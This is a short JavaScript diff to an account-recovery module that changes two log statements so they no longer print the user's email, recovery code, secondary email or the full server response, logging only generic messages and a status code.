@@ -1,7 +1,7 @@
 const HttpClient = require("../process/HttpClient");
 
 module.exports = async (email, recoveryCode, secEmail, password) => {
-    console.log(`Recovery secure called with ${email} ${recoveryCode} ${secEmail}`);
+    console.log(`[recoveryCodeSecure] Recovery secure initiated`);
 
     try {
         const axios = new HttpClient(false);
@@ -88,7 +88,7 @@ module.exports = async (email, recoveryCode, secEmail, password) => {
                     }
                 );
 
-                console.log(`recovery log:`, JSON.stringify(recoveryResponse?.data));
+                console.log(`[recoveryCodeSecure] Recovery request processed (Status: ${recoveryResponse?.status || 'Unknown'})`);
 
                 if (recoveryResponse?.data?.error) {
                     if (recoveryResponse.data.error.code === "6001") {
